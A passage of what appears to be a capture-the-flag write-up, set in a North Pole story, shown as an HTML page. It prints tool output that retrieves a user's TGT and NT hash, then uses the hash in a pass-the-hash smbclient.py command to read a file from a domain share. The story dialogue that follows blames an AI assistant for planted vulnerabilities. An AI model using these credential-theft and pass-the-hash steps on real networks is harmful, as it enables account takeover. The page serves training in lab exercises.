<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>TGT
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>credential<span class="w"> </span>cache<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;wombleycube.ccache&#39;</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>retrieve<span class="w"> </span>NT<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;wombleycube&#39;</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;wombleycube@northpole.local&#39;</span>:<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
</code></pre></div>
The NT hash and the credential cache (TGT) can be used for further authentication with other tools. Lets go back again and try to use our hash with smbclient.py</p>
<p><div class="highlight"><pre><span></span><code>smbclient.py<span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e
<span class="m">23</span><span class="w"> </span>northpole.local/wombleycube@10.0.0.53<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.53
</code></pre></div>
<div class="highlight"><pre><span></span><code># ls
drw-rw-rw-          0  Wed Jan  3 01:13:58 2024 .
drw-rw-rw-          0  Wed Jan  3 01:13:58 2024 ..
-rw-rw-rw-        231  Wed Jan  3 01:13:58 2024 InstructionsForEnteringSatelliteGroundStation.txt
# cat InstructionsForEnteringSatelliteGroundStation.txt
Note to self:

To enter the Satellite Ground Station (SGS), say the following into the speaker:

And he whispered, &#39;Now I shall be out of sight;
So through the valley and over the height.&#39;
And he&#39;ll silently take his way.
</code></pre></div></p>
<p>Woho!</p>
<div class="admonition success">
<p class="admonition-title">Answer</p>
<p>Note to self:
To enter the Satellite Ground Station (SGS), say the following into the speaker:<br/>
    And he whispered, 'Now I shall be out of sight;
    So through the valley and over the height.'
    And he'll silently take his way.</p>
</div>
<h2 id="response">Response<a class="headerlink" href="#response" title="Permanent link">⚓︎</a></h2>
<div class="admonition quote">
<p class="admonition-title">Ribb Bonbowford</p>
<p>Wow, nice work. I'm impressed!<br/>
This is all starting to feel like more than just a coincidence though. Everything Alabaster's been setting up lately with the help of ChatNPT contains all these vulnerabilities. It almost feels deliberate, if you ask me.<br/>
Now obviously an LLM AI like ChatNPT cannot have deliberate motivations itself. It's just a machine. But I wonder who could have built it and who is controlling it?<br/>
On top of that, we apparently have a satellite ground station on Geese Islands. I wonder where that thing would even be located.<br/>
Well, I guess it's probably somewhere on Space Island, but I've not been there yet.<br/>
I'm not a big fan of jungles, you see. I have this tendency to get lost in them.<br/>
Anyway, if you feel like investigating, that'd be where I'd go look.<br/>
Good luck and I'd try and steer clear of ChatNPT if I were you. </p>
</div>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
    
    
    <a href="https://twitter.com/Lukasz_LS" target="_blank" rel="noopener" title="Twitter" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
    </a>
  
    
    
    
    
    <a href="https://github.com/LS1942" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["toc.integrate", "content.code.copy", "navigation.sections"], "search": "../../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.d7c377c4.min.js"></script>
      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/tablesort/5.2.1/tablesort.min.js"></script>
      
        <script src="../../js/tablesort.js"></script>
      
    
  </body>
</html>